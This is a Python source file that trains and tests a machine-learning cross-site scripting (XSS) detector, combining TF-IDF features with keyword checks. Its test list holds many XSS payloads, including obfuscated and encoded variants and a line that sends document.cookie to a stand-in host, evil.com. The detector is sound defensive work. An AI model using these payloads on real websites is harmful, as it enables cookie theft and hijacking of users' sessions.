import os
import pandas as pd
import numpy as np
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import classification_report, confusion_matrix
import joblib
import re
from scipy.sparse import hstack


def contains_malicious_pattern(input_string):
    # Convert to lowercase for case-insensitive matching
    lower_input = input_string.lower()
    
    # List of dangerous JavaScript functions and properties
    dangerous_js = ['alert', 'eval', 'document.cookie', 'window.location', 'localStorage', 'sessionStorage', 'fetch']
    
    # Check for JavaScript events with dangerous functions
    js_events = ['onclick', 'onload', 'onerror', 'onmouseover', 'onfocus', 'onsubmit', 'src']
    for event in js_events:
        if event in lower_input:
            for danger in dangerous_js:
                if danger in lower_input:
                    return True
    
    # Check for JavaScript URLs
    if 'javascript:' in lower_input:
        for danger in dangerous_js:
            if danger in lower_input:
                return True
    
    # Check for script tags with dangerous content
    if '<script' in lower_input:
        for danger in dangerous_js:
            if danger in lower_input:
                return True
    
    return False

def contains_script_tags(input_string):
    return int(bool(re.search(r'<\s*script', input_string, re.IGNORECASE)))

def contains_js_events(input_string):
    events = ['onclick', 'onload', 'onerror', 'onmouseover', 'onfocus', 'onsubmit']
    return int(any(event in input_string.lower() for event in events))

def contains_js_urls(input_string):
    return int(bool(re.search(r'javascript:', input_string, re.IGNORECASE)))

def contains_encoded_chars(input_string):
    return int(bool(re.search(r'&#|%[0-9A-Fa-f]{2}|\\u[0-9A-Fa-f]{4}', input_string)))

def contains_dangerous_functions(input_string):
    functions = ['eval', 'setTimeout', 'setInterval', 'Function', 'constructor']
    return int(any(func in input_string for func in functions))

class XSSDetector:
    def __init__(self):
        self.vectorizer = None
        self.model = None

    def load_data(self, safe_file, malicious_file):
        project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        
        with open(os.path.join(project_root, safe_file), 'r') as file:
            safe_inputs = [line.strip() for line in file]
        
        with open(os.path.join(project_root, malicious_file), 'r') as file:
            malicious_inputs = [line.strip() for line in file]
        
        safe_df = pd.DataFrame({'input': safe_inputs, 'label': 0})
        malicious_df = pd.DataFrame({'input': malicious_inputs, 'label': 1})
        
        return pd.concat([safe_df, malicious_df], ignore_index=True)

    def preprocess_data(self, df):
    # TF-IDF vectorization
        self.vectorizer = TfidfVectorizer(max_features=5000, ngram_range=(1, 3))
        X_tfidf = self.vectorizer.fit_transform(df['input'])

    # Custom features
        X_custom = np.array([
            df['input'].apply(contains_script_tags),
            df['input'].apply(contains_js_events),
            df['input'].apply(contains_js_urls),
            df['input'].apply(contains_encoded_chars),
            df['input'].apply(contains_dangerous_functions),
            df['input'].apply(contains_malicious_pattern)  # New feature
        ]).T

    # Combine TF-IDF features with custom features
        X = hstack([X_tfidf, X_custom])

        y = df['label']
        return train_test_split(X, y, test_size=0.2, random_state=42)

    def train_model(self, X_train, y_train):
        self.model = RandomForestClassifier(n_estimators=100, max_depth=10, min_samples_split=5, random_state=42)
        # Perform cross-validation
        cv_scores = cross_val_score(self.model, X_train, y_train, cv=5)
        print(f"Cross-validation scores: {cv_scores}")
        print(f"Mean CV score: {cv_scores.mean():.2f} (+/- {cv_scores.std() * 2:.2f})")
        
        self.model.fit(X_train, y_train)

    def evaluate_model(self, X_test, y_test):
        y_pred = self.model.predict(X_test)
        print(classification_report(y_test, y_pred))
        print("Confusion Matrix:")
        print(confusion_matrix(y_test, y_pred))

    def save_model(self, filename='xss_model.joblib'):
        model_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'models')
        os.makedirs(model_dir, exist_ok=True)
        joblib.dump(self.model, os.path.join(model_dir, filename))
        joblib.dump(self.vectorizer, os.path.join(model_dir, 'xss_vectorizer.joblib'))
        print(f"Model saved in {model_dir}")

    def load_model(self, model_filename='xss_model.joblib', vectorizer_filename='xss_vectorizer.joblib'):
        model_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'models')
        self.model = joblib.load(os.path.join(model_dir, model_filename))
        self.vectorizer = joblib.load(os.path.join(model_dir, vectorizer_filename))


    def predict(self, input_string):
    # Check for malicious patterns first
        if contains_malicious_pattern(input_string):
            return 1  # Malicious

    # If no malicious pattern found, proceed with the model prediction
        X_tfidf = self.vectorizer.transform([input_string])

        X_custom = np.array([
            contains_script_tags(input_string),
            contains_js_events(input_string),
            contains_js_urls(input_string),
            contains_encoded_chars(input_string),
            contains_dangerous_functions(input_string),
            contains_malicious_pattern(input_string)  # New feature
        ]).reshape(1, -1)

        X = hstack([X_tfidf, X_custom])

        return self.model.predict(X)[0]

def main():
    detector = XSSDetector()
    
    # Load data
    df = detector.load_data('safe_user_inputs_xss.txt', 'transformed_xss_payloads.txt')
    
    # Preprocess and split data
    X_train, X_test, y_train, y_test = detector.preprocess_data(df)
    
    # Train model
    detector.train_model(X_train, y_train)
    
    # Evaluate model
    detector.evaluate_model(X_test, y_test)
    
    # Save model
    detector.save_model()
    
    # Test prediction
    test_inputs = [
    # Simple cases
    "<script>alert('XSS')</script>",
    "Hello, world!",
    "<img src=x onerror=alert('XSS')>",
    "Welcome to our website",
    "Script",
    "image",
    "XSS",
    # Basic HTML tags
    "<b>Bold</b>",
    "<i>Italic</i>",
    "<u>Underline</u>",
    "<a href='https://example.com'>Link</a>",
    "<div>Div content</div>",
    "<span>Span content</span>",
    # Script tags
    "<script>alert('XSS')</script>",
    "<script>document.write('Hello')</script>",
    "<script>window.location='http://evil.com'</script>",
    "<script>eval('alert(1)')</script>",
    "<script src='http://evil.com/xss.js'></script>",
    "<script>setTimeout(function(){alert('XSS')},1000)</script>",
    "<script>while(1){alert('XSS')}</script>",
    # Event handlers
    "<img src='x' onerror='alert(1)'>",
    "<body onload='alert(1)'>",
    "<div onmouseover='alert(1)'>Hover me</div>",
    "<input type='text' onfocus='alert(1)'>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<button onclick='alert(1)'>Click me</button>",
    # Encoded payloads
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
    # Obfuscated payloads
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script>x='alert';window </script>",
    "<script>eval('al'+'ert(1)')</script>",
    "<script>setTimeout('alert(1)', 1000)</script>",
    "<script>Function('alert(1)')()</script>",
    # Attributes
    "<img src='x' onerror='alert(document.cookie)'>",
    "<body onload='alert(document.cookie)'>",
    "<div onmouseover='alert(document.cookie)'>Hover me</div>",
    "<input type='text' onfocus='alert(document.cookie)'>",
    "<a href='javascript:alert(document.cookie)'>Click me</a>",
    "<button onclick='alert(document.cookie)'>Click me</button>",
    # Mixed content
    "<script>console.log('Safe content'); alert('XSS')</script>",
    "<div>Safe content <script>alert('XSS')</script></div>",
    "<p onclick='alert(1)'>Click me</p>",
    "<iframe src='http://example.com'></iframe>",
    "<form action='http://example.com'><input type='submit'></form>",
    # Regular content
    "This is a regular sentence.",
    "Here's some text without any HTML or JS.",
    "Welcome to our website!",
    "This input is completely safe.",
    "No scripts or events here.",
    "Just some benign text.",
    "Another safe string.",
    "More safe content.",
    "Yet another harmless input.",
    "All clear here.",
    # More complex cases
    "<img src='x' onerror='javascript:alert(document.cookie)'>",
    "<div onmouseover='javascript:alert(document.cookie)'>Hover me</div>",
    "<input type='text' onfocus='javascript:alert(document.cookie)'>",
    "<a href='javascript:alert(document.cookie)'>Click me</a>",
    "<button onclick='javascript:alert(document.cookie)'>Click me</button>",
    "<svg onload='alert(1)'>",
    "<svg><g onload='alert(1)'>",
    "<math><mtext onmouseover='alert(1)'>Hover me</mtext></math>",
    "<body onload='fetch(`http://evil.com?cookie=${document.cookie}`)'>",
    "<iframe src='http://evil.com'></iframe>",
    "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<link rel='stylesheet' href='javascript:alert(1)'>",
    "<object data='javascript:alert(1)'></object>",
    "<embed src='javascript:alert(1)'>",
    "<form action='javascript:alert(1)'><input type='submit'></form>",
    "<plaintext>alert('XSS')",
    "<xmp>alert('XSS')</xmp>",
    "<base href='javascript:alert(1)//'>",
    "<bdo onmouseover='alert(1)'>",
    "<isindex action='javascript:alert(1)'>",
    "<keygen onfocus='alert(1)'>",
    "<blink onclick='alert(1)'>Click me</blink>",
    "<listing onmouseover='alert(1)'>Hover me</listing>",
    "<nextid onclick='alert(1)'>Click me</nextid>",
    "<marquee onstart='alert(1)'>",
    "<comment onmouseover='alert(1)'>Hover me</comment>",
    "<nobr onclick='alert(1)'>Click me</nobr>",
    "<applet code='javascript:alert(1)'></applet>",
    "<meta onmouseover='alert(1)'>Hover me</meta>",
    "<link onmouseover='alert(1)'>Hover me</link>",
    "<param onmouseover='alert(1)'>Hover me</param>",
    "<menuitem onclick='alert(1)'>Click me</menuitem>",
    "<track onmouseover='alert(1)'>Hover me</track>",
    "<bgsound src='javascript:alert(1)'>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<image src='javascript:alert(1)'>"
]

    
    for input_string in test_inputs:
        prediction = detector.predict(input_string)
        print(f"Input: {input_string}")
        print(f"Prediction: {'Malicious' if prediction == 1 else 'Safe'}")
        print()

if __name__ == "__main__":
    main()